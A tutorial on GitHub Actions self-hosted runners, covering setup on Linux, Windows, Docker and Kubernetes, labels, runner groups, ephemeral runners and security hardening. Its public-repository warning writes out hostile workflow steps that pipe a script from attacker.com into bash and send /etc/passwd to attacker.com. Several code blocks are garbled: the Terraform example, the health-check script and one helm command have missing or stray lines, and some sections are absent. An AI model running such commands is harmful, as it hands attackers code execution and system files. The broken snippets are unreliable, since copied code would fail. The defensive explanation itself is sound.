## 1. What Are Runners? — GitHub-Hosted vs Self-Hosted

A **runner** is simply a **machine that executes your GitHub Actions workflow jobs**. When you write `runs-on: ubuntu-latest`, you're telling GitHub "run this job on a runner."

There are two types of runners:

```
┌────────────────────────────────────────────────────────────────┐
│                       RUNNERS                                  │
├──────────────────────────┬─────────────────────────────────────┤
│   GitHub-Hosted          │   Self-Hosted                       │
├──────────────────────────┼─────────────────────────────────────┤
│ Managed by GitHub        │ Managed by YOU                      │
│ Fresh VM each job        │ Your own machine(s)                 │
│ Pre-installed tools      │ You install what you need           │
│ Pay per minute           │ You pay for the hardware            │
│ No maintenance           │ You maintain everything             │
│ Limited customization    │ Full customization                  │
│ Public internet access   │ Can access private networks         │
│ Standard hardware        │ Any hardware (GPU, ARM, etc.)       │
├──────────────────────────┼─────────────────────────────────────┤
│ runs-on: ubuntu-latest   │ runs-on: self-hosted                │
│ runs-on: windows-latest  │ runs-on: [self-hosted, linux, x64]  │
│ runs-on: macos-latest    │ runs-on: [self-hosted, gpu]         │
└──────────────────────────┴─────────────────────────────────────┘
```

### GitHub-Hosted Runner Specs (for reference):

```
Standard GitHub-Hosted Runners:
├── ubuntu-latest   → 4 vCPU, 16 GB RAM, 14 GB SSD
├── windows-latest  → 4 vCPU, 16 GB RAM, 14 GB SSD
├── macos-latest    → 3 vCPU (M1), 7 GB RAM, 14 GB SSD
└── Larger runners (paid):
    ├── 8 vCPU, 32 GB RAM
    ├── 16 vCPU, 64 GB RAM
    ├── 32 vCPU, 128 GB RAM
    └── 64 vCPU, 256 GB RAM
```

## 2. Why Use Self-Hosted Runners?

There are several compelling reasons to run your own runners:

### Reason 1: Access to Private Networks

```
GitHub-Hosted Runner:
┌─────────┐                    ┌─────────────┐
│ GitHub   │──── Internet ────►│ Your Private │ ❌ Can't reach!
│ Runner   │                   │ Database     │
└─────────┘                    └─────────────┘
                               (behind firewall)

Self-Hosted Runner:
┌─────────┐                    ┌─────────────┐
│ Your     │──── Private ─────►│ Your Private │ ✅ Direct access!
│ Runner   │     Network       │ Database     │
└─────────┘                    └─────────────┘
(inside your network)
```

### Reason 2: Custom Hardware

```
Need GPU for ML model training?     → Self-hosted with GPU
Need ARM for ARM builds?            → Self-hosted with ARM
Need 256 GB RAM for large builds?   → Self-hosted with beefy machine
Need macOS for iOS builds?          → Self-hosted Mac Mini
Need specific OS (RHEL, SUSE)?      → Self-hosted
Need FPGA, TPU, or special HW?      → Self-hosted
```

### Reason 3: Cost Savings at Scale

```
GitHub-Hosted (Free tier):
├── Public repos:  Unlimited free minutes
├── Private repos: 2,000 min/month (Free), 3,000 (Pro), 50,000 (Enterprise)
├── macOS: 10x multiplier (1 min = 10 min from quota)
├── Windows: 2x multiplier
└── Overage: $0.008/min Linux, $0.016/min Windows, $0.08/min macOS

Self-Hosted:
├── Your own hardware: Pay once, use forever
├── Cloud VM: Fixed monthly cost (often cheaper at scale)
├── No per-minute charges
└── No multipliers
```

### Reason 4: Persistent Environment

```
GitHub-Hosted:
├── Fresh VM every job → Clean but slow (re-install everything)
└── Caching helps but adds complexity

Self-Hosted:
├── Tools stay installed between jobs → Faster!
├── Docker images already cached → Faster!
├── Dependencies already cached → Faster!
└── But: More risk of state leaking between jobs
```

### Reason 5: Compliance & Data Residency

```
Some organizations require:
├── Code never leaves the corporate network
├── Builds happen in specific regions/countries
├── No third-party access to source code
├── Air-gapped environments (no internet)
└── Specific compliance certifications (HIPAA, SOC2)
```

## 3. When NOT to Use Self-Hosted Runners

Self-hosted runners aren't always the right choice:

```
❌ DON'T use self-hosted runners when:
├── You're a small team with low CI/CD usage
│   (GitHub's free minutes are probably enough)
│
├── You don't want to maintain infrastructure
│   (Runners need updates, monitoring, security patches)
│
├── Your repos are PUBLIC
│   (Anyone can fork and submit PRs that run on YOUR machines!)
│   ⚠️ This is a MAJOR security risk!
│
├── You need different OS for each job
│   (Easier to use GitHub-hosted for matrix builds)
│
└── You don't have DevOps/infra expertise
    (Things will break and you need to fix them)
```

### The Public Repo Warning:

```
⚠️ CRITICAL SECURITY WARNING ⚠️

NEVER use self-hosted runners with PUBLIC repositories!

Why? Because:
1. Anyone can fork your public repo
2. They can submit a PR with a modified workflow
3. That workflow runs on YOUR self-hosted runner
4. Their code has access to your machine, network, secrets!

Attack scenario:
  Attacker forks your repo → Modifies workflow to:
    - run: curl http://attacker.com/steal.sh | bash
    - run: cat /etc/passwd | curl http://attacker.com/upload
    - run: bitcoin-miner --start

Self-hosted runners + public repos = YOU GET HACKED
```

## 4. Self-Hosted Runner Architecture

Let's understand how self-hosted runners communicate with GitHub:

```
┌───────────────────────────────────────────────────────┐
│                    GITHUB.COM                         │
│                                                       │
│  ┌──────────┐   ┌──────────────┐   ┌──────────────┐ │
│  │ Workflow  │──►│ Job Queue    │──►│ Runner API   │ │
│  │ Dispatch  │   │ (per runner  │   │ (HTTPS)      │ │
│  │           │   │  group/label)│   │              │ │
│  └──────────┘   └──────────────┘   └──────┬───────┘ │
│                                            │         │
└────────────────────────────────────────────┼─────────┘
                                             │
                          HTTPS Long Poll     │
                          (outbound only!)    │
                                             │
┌────────────────────────────────────────────┼─────────┐
│              YOUR NETWORK                  │         │
│                                            ▼         │
│  ┌──────────────────────────────────────────────┐   │
│  │           SELF-HOSTED RUNNER                  │   │
│  │                                               │   │
│  │  ┌─────────────┐  ┌──────────────────────┐   │   │
│  │  │ Runner      │  │ Worker Process        │   │   │
│  │  │ Listener    │  │ (executes job steps)  │   │   │
│  │  │ (polls      │  │                       │   │   │
│  │  │  GitHub)    │  │ ┌──────┐ ┌──────┐    │   │   │
│  │  │             │──►│ Step1 │►│ Step2 │►...│   │   │
│  │  └─────────────┘  │ └──────┘ └──────┘    │   │   │
│  │                    └──────────────────────┘   │   │
│  └──────────────────────────────────────────────┘   │
│                                                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │ Database │  │ Internal │  │ Other resources   │  │
│  │ Server   │  │ APIs     │  │ (GPU, NFS, etc.)  │  │
│  └──────────┘  └──────────┘  └──────────────────┘  │
│                                                      │
└──────────────────────────────────────────────────────┘
```

### Key Architecture Points:

```
Communication Flow:
├── Runner → GitHub (HTTPS outbound on port 443)
│   └── The runner POLLS GitHub for new jobs (long polling)
│   └── NO inbound connections needed!
│   └── Works behind firewalls and NAT
│
├── GitHub → Runner (via the same HTTPS connection)
│   └── Sends job details when a job is queued
│   └── Sends cancellation signals
│
└── Runner → GitHub (uploads)
    └── Logs are streamed back in real-time
    └── Artifacts are uploaded via HTTPS
    └── Status updates sent back
```

## 5. Setting Up a Self-Hosted Runner on Linux

Let's set up a runner on a Linux machine step by step.

### Prerequisites:

```bash
# Required:
# - Linux machine (Ubuntu 20.04+ recommended)
# - 2+ GB RAM
# - 15+ GB disk space
# - Network access to github.com (HTTPS port 443)
# - A GitHub account with admin access to the repo/org

# Recommended packages:
sudo apt-get update
sudo apt-get install -y \
    curl \
    jq \
    git \
    docker.io \
    build-essential
```

### Step 1: Get the Runner Token

```
Via GitHub UI:
1. Go to your repository (or organization) settings
2. Settings → Actions → Runners
3. Click "New self-hosted runner"
4. Select "Linux" and your architecture (x64, ARM64, ARM)
5. GitHub shows you the commands — including a TOKEN
```

Or via CLI:

```bash
# Get a registration token via API
TOKEN=$(gh api repos/{owner}/{repo}/actions/runners/registration-token \
  --method POST --jq '.token')
echo "Token: ${TOKEN}"
```

### Step 2: Download and Extract the Runner

```bash
# Create a directory for the runner
mkdir -p ~/actions-runner && cd ~/actions-runner

# Download the latest runner package (check GitHub for current version)
curl -o actions-runner-linux-x64-2.314.1.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.314.1/actions-runner-linux-x64-2.314.1.tar.gz

# Verify the hash (important for security!)
echo "6c726a118bbe02cd32e222f890e1e476567bf299353a96886ba75b423c1137b5  actions-runner-linux-x64-2.314.1.tar.gz" | shasum -a 256 -c

# Extract
tar xzf ./actions-runner-linux-x64-2.314.1.tar.gz
```

### Step 3: Configure the Runner

```bash
# Run the configuration script
./config.sh \
  --url https://github.com/YOUR-ORG/YOUR-REPO \
  --token YOUR_TOKEN_HERE
```

The interactive setup will ask:

```
$ ./config.sh --url https://github.com/myorg/myrepo --token ABCDEF123

--------------------------------------------------------------------------------
|        ____ _ _   _   _       _          _        _   _                      |
|       / ___(_) |_| | | |_   _| |__      / \   ___| |_(_) ___  _ __  ___     |
|      | |  _| | __| |_| | | | | '_ \    / _ \ / __| __| |/ _ \| '_ \/ __|    |
|      | |_| | | |_|  _  | |_| | |_) |  / ___ \ (__| |_| | (_) | | | \__ \    |
|       \____|_|\__|_| |_|\__,_|_.__/  /_/   \_\___|\__|_|\___/|_| |_|___/    |
|                                                                              |
|                       Self-hosted runner registration                        |
|                                                                              |
--------------------------------------------------------------------------------

# Enter the name of the runner group (default: Default):
> [press Enter]

# Enter the name of the runner (default: my-server):
> my-linux-runner-01

# Enter any additional labels (comma separated, e.g., gpu,large):
> linux,x64,docker,production

# Enter the working directory (default: _work):
> [press Enter]

✅ Runner successfully configured!
```

### Step 4: Run the Runner

```bash
# Start the runner interactively (for testing)
./run.sh

# Output:
# √ Connected to GitHub
# Current runner version: '2.314.1'
# Listening for Jobs...
```

### Step 5: Install as a System Service (recommended)

```bash
# Install the service (requires sudo)
sudo ./svc.sh install

# Start the service
sudo ./svc.sh start

# Check status
sudo ./svc.sh status

# The runner will now:
# - Start automatically on boot
# - Restart if it crashes
# - Run as a background service
```

### Full Non-Interactive Setup Script:

```bash
#!/bin/bash
# setup-runner.sh — Automated runner setup

RUNNER_VERSION="2.314.1"
GITHUB_URL="https://github.com/myorg/myrepo"
RUNNER_NAME="runner-$(hostname)"
RUNNER_LABELS="linux,x64,docker"
RUNNER_TOKEN="$1"   # Pass token as first argument

# Validate input
if [ -z "${RUNNER_TOKEN}" ]; then
    echo "Usage: $0 <registration-token>"
    exit 1
fi

# Create directory
mkdir -p ~/actions-runner && cd ~/actions-runner

# Download
curl -sL -o runner.tar.gz \
  "https://github.com/actions/runner/releases/download/v${RUNNER_VERSION}/actions-runner-linux-x64-${RUNNER_VERSION}.tar.gz"

# Extract
tar xzf runner.tar.gz

# Configure (non-interactive)
./config.sh \
  --url "${GITHUB_URL}" \
  --token "${RUNNER_TOKEN}" \
  --name "${RUNNER_NAME}" \
  --labels "${RUNNER_LABELS}" \
  --unattended \
  --replace

# Install and start as service
sudo ./svc.sh install
sudo ./svc.sh start

echo "✅ Runner '${RUNNER_NAME}' is configured and running!"
```

## 6. Setting Up a Self-Hosted Runner on Windows

### Step 1: Download and Extract

```powershell
# Create a folder
mkdir C:\actions-runner; cd C:\actions-runner

# Download the runner
Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v2.314.1/actions-runner-win-x64-2.314.1.zip -OutFile actions-runner-win-x64-2.314.1.zip

# Extract
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD\actions-runner-win-x64-2.314.1.zip", "$PWD")
```

### Step 2: Configure

```powershell
# Configure the runner
.\config.cmd --url https://github.com/YOUR-ORG/YOUR-REPO --token YOUR_TOKEN
```

### Step 3: Run as a Windows Service

```powershell
# Start interactively (for testing)
.\run.cmd

# Or install as a Windows service
.\svc.cmd install
.\svc.cmd start
.\svc.cmd status
```

### Step 4: Verify the Service

```powershell
# Check the Windows service
Get-Service "actions.runner.*"

# View runner logs
Get-Content C:\actions-runner\_diag\Runner_*.log -Tail 50
```

## 8. Runner Scopes — Repository, Organization, Enterprise

Self-hosted runners can be registered at different levels:

```
┌──────────────────────────────────────────────────────┐
│                  ENTERPRISE                           │
│  (Available to ALL orgs and repos in the enterprise)  │
│                                                       │
│  ┌──────────────────────────────────────────────┐    │
│  │              ORGANIZATION                     │    │
│  │  (Available to ALL or SELECTED repos in org)  │    │
│  │                                               │    │
│  │  ┌──────────────────────────────────┐        │    │
│  │  │          REPOSITORY              │        │    │
│  │  │  (Available to this repo ONLY)   │        │    │
│  │  └──────────────────────────────────┘        │    │
│  │                                               │    │
│  └──────────────────────────────────────────────┘    │
│                                                       │
└──────────────────────────────────────────────────────┘
```

### Comparison:

| Scope | Best For | Who Can Manage | Registration URL |
|-------|----------|----------------|-----------------|
| **Repository** | Single project, testing | Repo admins | `github.com/{owner}/{repo}` |
| **Organization** | Shared across team repos | Org admins | `github.com/organizations/{org}` |
| **Enterprise** | Company-wide shared runners | Enterprise admins | Enterprise settings |

### When to Use Which:

```
Repository-level:
├── Testing and development
├── Project-specific requirements (special hardware)
└── Small teams with 1-2 repos

Organization-level (most common):
├── Shared runners for multiple repos
├── Centralized management
├── Cost-efficient resource sharing
└── Consistent runner configuration

Enterprise-level:
├── Large companies with multiple organizations
├── Centralized IT management
└── Company-wide policies and compliance
```

### Registering at Organization Level:

```bash
# Get org-level registration token
TOKEN=$(gh api orgs/{org}/actions/runners/registration-token \
  --method POST --jq '.token')

# Configure runner for the organization
./config.sh \
  --url https://github.com/organizations/YOUR-ORG \
  --token "${TOKEN}" \
  --name "shared-runner-01" \
  --labels "linux,x64,docker" \
  --runnergroup "default" \
  --unattended
```

## 9. Labels — Targeting Specific Runners

Labels are how you **tell GitHub which runner to use** for a job. Every self-hosted runner has labels.

### Default Labels:

When you register a runner, it automatically gets these labels:

```
Default Labels (auto-assigned):
├── self-hosted       → Always present on self-hosted runners
├── Linux / Windows / macOS  → Based on the OS
└── X64 / ARM / ARM64       → Based on the architecture
```

### Custom Labels:

You can add your own labels during setup or later:

```bash
# Add labels during configuration
./config.sh --url ... --token ... --labels "gpu,large-memory,production"

# Add labels later (without reconfiguring)
# Via GitHub UI: Settings → Actions → Runners → [runner] → Edit labels
```

### Using Labels in Workflows:

```yaml
jobs:
  # Match ANY self-hosted runner
  basic:
    runs-on: self-hosted

  # Match a self-hosted Linux x64 runner
  linux-build:
    runs-on: [self-hosted, linux, x64]

  # Match a runner with GPU
  ml-training:
    runs-on: [self-hosted, gpu]

  # Match a specific runner for production deployments
  deploy:
    runs-on: [self-hosted, production, linux]

  # Match a runner with large memory
  big-build:
    runs-on: [self-hosted, large-memory]
```

### How Label Matching Works:

```
runs-on: [self-hosted, linux, gpu]

GitHub looks for a runner that has ALL these labels:
├── self-hosted  ✅ (must be self-hosted)
├── linux        ✅ (must be Linux)
└── gpu          ✅ (must have GPU label)

If no runner matches ALL labels → Job queues indefinitely!
```

### Label Strategy Example:

```
Runner: build-server-01
Labels: self-hosted, linux, x64, docker, large-memory

Runner: build-server-02
Labels: self-hosted, linux, x64, docker

Runner: gpu-server-01
Labels: self-hosted, linux, x64, gpu, cuda

Runner: mac-mini-01
Labels: self-hosted, macos, arm64, xcode15

Runner: windows-build-01
Labels: self-hosted, windows, x64, dotnet
```

```yaml
# This job would run on build-server-01 or build-server-02
runs-on: [self-hosted, linux, docker]

# This job would ONLY run on build-server-01
runs-on: [self-hosted, linux, large-memory]

# This job would ONLY run on gpu-server-01
runs-on: [self-hosted, gpu, cuda]

# This job would ONLY run on mac-mini-01
runs-on: [self-hosted, macos, xcode15]
```

## 10. Runner Groups — Organizing and Restricting Access

**Runner groups** let you organize runners and control which repositories can use them. This is available at the **organization** and **enterprise** levels.

### Why Runner Groups?

```
Without groups:
  ALL runners are available to ALL repos
  → Security risk! (a test repo could use your production runner)

With groups:
  Group: "production-runners"  → Only "myapp" and "api" repos
  Group: "dev-runners"         → All repos
  Group: "gpu-runners"         → Only "ml-training" repo
```

### Creating a Runner Group:

```
Via GitHub UI:
1. Organization Settings → Actions → Runner groups
2. Click "New runner group"
3. Name: "production-runners"
4. Repository access: "Selected repositories" → choose repos
5. Workflow access: Can restrict to specific workflows too
```

Via API:

```bash
# Create a runner group
gh api orgs/{org}/actions/runner-groups \
  --method POST \
  -f name="production-runners" \
  -f visibility="selected" \
  --input - <<EOF
{
  "name": "production-runners",
  "visibility": "selected",
  "selected_repository_ids": [123, 456],
  "allows_public_repositories": false
}
EOF
```

### Assigning Runners to Groups:

```bash
# During configuration
./config.sh \
  --url https://github.com/organizations/YOUR-ORG \
  --token "${TOKEN}" \
  --runnergroup "production-runners"

# Or move a runner to a different group via UI/API
```

### Group Configuration Best Practice:

```
Organization: my-company
├── Runner Group: "default"
│   ├── Repos: All private repos
│   ├── Runners: dev-runner-01, dev-runner-02
│   └── Purpose: General CI/CD
│
├── Runner Group: "production"
│   ├── Repos: myapp, api-service, frontend
│   ├── Runners: prod-runner-01, prod-runner-02
│   └── Purpose: Production deployments only
```

## 13. Auto-Scaling Self-Hosted Runners

For dynamic workloads, you want runners to **scale up** when there are queued jobs and **scale down** when idle.

### Option 1: GitHub's Built-in Webhooks + Custom Scaler

```
How auto-scaling works:
1. GitHub sends a webhook when a job is queued
2. Your scaler receives the webhook
3. Scaler provisions a new runner (VM/container)
4. Runner picks up the job
5. After the job completes, runner shuts down
```

```python
# Simple webhook handler example (Python/Flask)
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    event = request.headers.get('X-GitHub-Event')
    payload = request.json

    if event == 'workflow_job':
        action = payload['action']

        if action == 'queued':
            # A job needs a runner — spin one up!
            labels = payload['workflow_job']['labels']
            if 'self-hosted' in labels:
                provision_runner(labels)

        elif action == 'completed':
            # Job is done — clean up
            runner_name = payload['workflow_job']['runner_name']
            cleanup_runner(runner_name)

    return '', 200
```

### Option 2: Actions Runner Controller (ARC) — Kubernetes-Based

This is the **official** and **recommended** way to auto-scale runners. We'll cover this in detail in Section 16.

### Option 3: Terraform-Based Auto-Scaling

```hcl
# terraform/main.tf — Auto-scaling runners on AWS

resource "aws_autoscaling_group" "runners" {
  name                = "github-runners"
  min_size            = 1
  max_size            = 10
  desired_capacity    = 2

  launch_template {
    id      = aws_launch_template.runner.id
    version = "$Latest"
  }

    key                 = "Name"
    value               = "github-runner"

  }
}

      -H "Authorization: token ${var.github_pat}" \
```

## 14. Ephemeral Runners — One Job, One Runner

**Ephemeral runners** are runners that only process **one job** and then automatically de-register. They're the safest option because there's no state leaking between jobs.

### How Ephemeral Runners Work:

```
Normal Runner:                    Ephemeral Runner:
┌─────────┐                      ┌─────────┐
│ Runner   │                      │ Runner   │
│ starts   │                      │ starts   │
└────┬─────┘                      └────┬─────┘
     │                                 │
     ▼                                 ▼
┌─────────┐                      ┌─────────┐
│ Job 1   │                      │ Job 1   │
│ runs    │                      │ runs    │
└────┬─────┘                      └────┬─────┘
     │                                 │
     ▼                                 ▼
┌─────────┐                      ┌─────────┐
│ Job 2   │ ← Same machine!      │ Runner   │ ← De-registers!
│ runs    │    State could        │ shuts    │    Clean every time.
└────┬─────┘    leak!             │ down     │
     │                            └──────────┘
     ▼
┌─────────┐
│ Job 3   │
│ runs    │
└─────────┘
```

### Configuring an Ephemeral Runner:

```bash
# The --ephemeral flag is the key!
./config.sh \
  --url https://github.com/myorg/myrepo \
  --token "${TOKEN}" \
  --name "ephemeral-runner-$(date +%s)" \
  --ephemeral \          # ← This makes it ephemeral!
  --unattended

# Run the job
./run.sh
# After the job completes, the runner automatically de-registers
```

### Ephemeral Runner Lifecycle:

```
1. Provision a new machine/container
2. Download and configure runner with --ephemeral
3. Start the runner (./run.sh)
4. Runner picks up ONE job from the queue
5. Runner executes the job
6. Runner automatically de-registers from GitHub
7. Destroy the machine/container
8. Go to step 1 (for the next job)
```

### JIT (Just-In-Time) Runners:

GitHub also supports JIT runners that skip the registration step entirely:

```bash
# Generate a JIT config via API
JIT_CONFIG=$(gh api orgs/{org}/actions/runners/generate-jitconfig \
  --method POST \
  -f name="jit-runner-$(date +%s)" \
  -f runner_group_id=1 \
  -f labels='["self-hosted","linux","x64"]' \
  --jq '.encoded_jit_config')

# Start the runner with the JIT config (no config.sh needed!)
./run.sh --jitconfig "${JIT_CONFIG}"
```

## 15. Self-Hosted Runners in Docker

Running the GitHub Actions runner inside a Docker container is great for:
- Easy provisioning and cleanup
- Consistent environment
- Isolation between jobs
- Works well with ephemeral runners

### Basic Dockerfile for a Runner:

```dockerfile
# Dockerfile
FROM ubuntu:22.04

# Avoid interactive prompts
ARG DEBIAN_FRONTEND=noninteractive

# Install dependencies
RUN apt-get update && apt-get install -y \
    curl \
    jq \
    git \
    sudo \
    unzip \
    zip \
    wget \
    ca-certificates \
    gnupg \
    lsb-release \
    && rm -rf /var/lib/apt/lists/*

# Install Docker CLI (for Docker-in-Docker or Docker socket mounting)
RUN install -m 0755 -d /etc/apt/keyrings && \
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg && \
    echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" > /etc/apt/sources.list.d/docker.list && \
    apt-get update && \
    apt-get install -y docker-ce-cli && \
    rm -rf /var/lib/apt/lists/*

# Create a runner user
RUN useradd -m -s /bin/bash runner && \
    echo "runner ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Set up the runner
ARG RUNNER_VERSION=2.314.1
WORKDIR /home/runner/actions-runner

RUN curl -sL -o runner.tar.gz \
    "https://github.com/actions/runner/releases/download/v${RUNNER_VERSION}/actions-runner-linux-x64-${RUNNER_VERSION}.tar.gz" && \
    tar xzf runner.tar.gz && \
    rm runner.tar.gz && \
    ./bin/installdependencies.sh && \
    chown -R runner:runner /home/runner

# Copy the entrypoint script
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

USER runner

ENTRYPOINT ["/entrypoint.sh"]
```

### Entrypoint Script:

```bash
#!/bin/bash
# entrypoint.sh

# Validate required environment variables
if [ -z "${GITHUB_URL}" ] || [ -z "${RUNNER_TOKEN}" ]; then
    echo "Error: GITHUB_URL and RUNNER_TOKEN must be set!"
    exit 1
fi

# Configure the runner
./config.sh \
    --url "${GITHUB_URL}" \
    --token "${RUNNER_TOKEN}" \
    --name "${RUNNER_NAME:-docker-runner-$(hostname)}" \
    --labels "${RUNNER_LABELS:-self-hosted,linux,x64,docker}" \
    --ephemeral \
    --unattended \
    --replace

# Cleanup function
cleanup() {
    echo "Removing runner..."
    ./config.sh remove --token "${RUNNER_TOKEN}" 2>/dev/null || true
}
trap cleanup EXIT SIGTERM SIGINT

# Start the runner
./run.sh
```

### Build and Run:

```bash
# Build the image
docker build -t github-runner:latest .

# Run a single ephemeral runner
docker run -d \
    --name runner-01 \
    -e GITHUB_URL="https://github.com/myorg" \
    -e RUNNER_TOKEN="ABCDEF123456" \
    -e RUNNER_NAME="docker-runner-01" \
    -e RUNNER_LABELS="self-hosted,linux,x64,docker" \
    github-runner:latest
```

### Docker Compose for Multiple Runners:

```yaml
# docker-compose.yml
services:
  runner-1:
    build: .
    environment:
      GITHUB_URL: https://github.com/myorg
      RUNNER_TOKEN: ${RUNNER_TOKEN}
      RUNNER_NAME: runner-01
      RUNNER_LABELS: self-hosted,linux,x64,docker
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # For Docker builds
    restart: unless-stopped

  runner-2:
    build: .
    environment:
      GITHUB_URL: https://github.com/myorg
      RUNNER_TOKEN: ${RUNNER_TOKEN}
      RUNNER_NAME: runner-02
      RUNNER_LABELS: self-hosted,linux,x64,docker
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    restart: unless-stopped

  runner-3:
    build: .
    environment:
      GITHUB_URL: https://github.com/myorg
      RUNNER_TOKEN: ${RUNNER_TOKEN}
      RUNNER_NAME: runner-03
      RUNNER_LABELS: self-hosted,linux,x64,docker
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    restart: unless-stopped
```

```bash
# Start 3 runners
RUNNER_TOKEN=ABCDEF123 docker compose up -d

# Scale to 5 runners
docker compose up -d --scale runner-1=5
```

### Docker Socket vs Docker-in-Docker:

```
Two ways to use Docker inside a runner container:

Option 1: Docker Socket Mounting (recommended)
├── Mount /var/run/docker.sock from the host
├── Containers are created on the HOST Docker daemon
├── Faster (no nested Docker)
├── Shared cache with host
└── ⚠️ Security risk: runner has full Docker access on host

Option 2: Docker-in-Docker (DinD)
├── Run a full Docker daemon inside the container
├── Completely isolated
├── Requires --privileged flag
└── ⚠️ Also a security risk (privileged mode)
```

## 16. Self-Hosted Runners on Kubernetes (ARC)

**Actions Runner Controller (ARC)** is the **official, recommended way** to run auto-scaling self-hosted runners on Kubernetes.

### What is ARC?

```
ARC = Actions Runner Controller

It's a Kubernetes operator that:
├── Watches for queued GitHub Actions jobs
├── Automatically creates runner Pods when jobs are queued
├── Scales down when jobs complete
├── Supports ephemeral runners (clean every time)
├── Manages runner registration/deregistration
└── Supports runner groups and labels
```

### Architecture:

```
┌──────────────────────────────────────────────────────┐
│                   KUBERNETES CLUSTER                  │
│                                                       │
│  ┌─────────────────────────────────────────────────┐ │
│  │         ARC Controller (Deployment)              │ │
│  │                                                  │ │
│  │  Watches GitHub API for queued jobs              │ │
│  │  Creates/deletes runner Pods as needed           │ │
│  └─────────────────────────┬───────────────────────┘ │
│                             │                         │
│              Creates Pods   │   when jobs are queued  │
│                             ▼                         │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐             │
│  │ Runner  │  │ Runner  │  │ Runner  │             │
│  │ Pod 1   │  │ Pod 2   │  │ Pod 3   │  ← Scale!  │
│  │         │  │         │  │         │             │
│  │ Job A   │  │ Job B   │  │ Job C   │             │
│  └─────────┘  └─────────┘  └─────────┘             │
│       ▲                                              │
│       │ (ephemeral — destroyed after job)             │
│                                                       │
└──────────────────────────────────────────────────────┘
```

### Installing ARC with Helm:

```bash
# Step 1: Install cert-manager (required dependency)
kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.14.4/cert-manager.yaml

# Wait for cert-manager to be ready
kubectl wait --for=condition=Available deployment/cert-manager -n cert-manager --timeout=300s

# Step 2: Add the ARC Helm repository
helm repo add oci://ghcr.io/actions/actions-runner-controller-charts

# Step 3: Install the ARC controller
helm install arc \
    --namespace arc-systems \
    --create-namespace \
    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

# Step 4: Create a GitHub App or PAT for authentication
# (GitHub App is recommended for production)
```

### Creating a Runner Scale Set:

```bash
# Install a runner scale set (this is what creates the actual runners)
helm install arc-runner-set \
    --namespace arc-runners \
    --create-namespace \
    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set \
    --set githubConfigUrl="https://github.com/myorg" \
    --set githubConfigSecret.github_token="ghp_xxxxxxxxxxxx" \
    --set minRunners=1 \
    --set maxRunners=10
```

### Custom Values File:

```yaml
# values.yaml
githubConfigUrl: "https://github.com/myorg"

githubConfigSecret:
  github_token: ""     # Or use a GitHub App

# Scaling configuration
minRunners: 1          # Minimum runners always available
maxRunners: 10         # Maximum runners to scale to

# Runner Pod template (customize the runner container)
template:
  spec:
    containers:
      - name: runner
        image: ghcr.io/actions/actions-runner:latest
        resources:
          requests:
            cpu: "1"
            memory: "2Gi"
          limits:
            cpu: "4"
            memory: "8Gi"
        volumeMounts:
          - name: work
            mountPath: /home/runner/_work
    volumes:
      - name: work
        emptyDir: {}

# Container mode (DinD or Kubernetes mode)
containerMode:
  type: "dind"          # Docker-in-Docker
  # type: "kubernetes"  # Run each step as a separate container

# Runner group (organization level)
runnerGroup: "default"
```

```bash

    --namespace arc-runners \
    --create-namespace \
    -f values.yaml \
    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set
```


```bash
#!/bin/bash
# check-runner-health.sh

RUNNER_DIR="/home/runner/actions-runner"
SERVICE_NAME="actions.runner.myorg-myrepo.runner-01"

echo "=== Runner Health Check ==="

# Check if service is running
if systemctl is-active --quiet "${SERVICE_NAME}"; then
    echo "✅ Service is running"

    echo "❌ Service is NOT running!"
    echo "   Attempting restart..."

if [ "${DISK_USAGE}" -gt 85 ]; then
    echo "⚠️  Disk usage is ${DISK_USAGE}% — cleaning up..."

    find "${RUNNER_DIR}/_work" -maxdepth 1 -mtime +7 -exec rm -rf {} \;
    # Clean Docker (if applicable)
    docker system prune -af --volumes 2>/dev/null || true
else
    echo "✅ Disk usage: ${DISK_USAGE}%"
fi

# Check connectivity to GitHub
if curl -sf https://api.github.com > /dev/null 2>&1; then
    echo "✅ GitHub connectivity OK"
else
    echo "❌ Cannot reach GitHub!"
fi

# Check runner process
if pgrep -f "Runner.Listener" > /dev/null; then
    echo "✅ Runner listener process is running"
else
    echo "❌ Runner listener process is NOT running!"
fi

echo "==========================="
```

## 18. Security Best Practices

Security is the **most critical aspect** of self-hosted runners. Here's everything you need to know:

### Hardening Checklist:

```
🔒 SELF-HOSTED RUNNER SECURITY CHECKLIST
│
├── ACCESS CONTROL
│   ├── ✅ NEVER use with public repositories
│   ├── ✅ Use runner groups to restrict repo access
│   ├── ✅ Use a dedicated user account (not root!)
│   ├── ✅ Minimize sudo access
│   └── ✅ Use ephemeral runners when possible
│
├── NETWORK
│   ├── ✅ Place runners in a dedicated network segment/VLAN
│   ├── ✅ Restrict outbound access to only required endpoints
│   ├── ✅ Use a firewall to block unnecessary inbound traffic
│   ├── ✅ Use HTTPS everywhere
│   └── ✅ Consider a bastion host for SSH access
│
├── OS & SOFTWARE
│   ├── ✅ Keep the OS patched and updated
│   ├── ✅ Keep the runner application updated
│   ├── ✅ Remove unnecessary software
│   ├── ✅ Enable SELinux/AppArmor
│   ├── ✅ Use disk encryption
│   └── ✅ Install and configure antivirus/EDR
│
├── SECRETS & CREDENTIALS
│   ├── ✅ Never store secrets on the runner machine
│   ├── ✅ Use GitHub Secrets (not env vars or files)
│   ├── ✅ Rotate runner tokens regularly
│   ├── ✅ Use short-lived credentials
│   └── ✅ Clean up credentials after each job
│
├── MONITORING
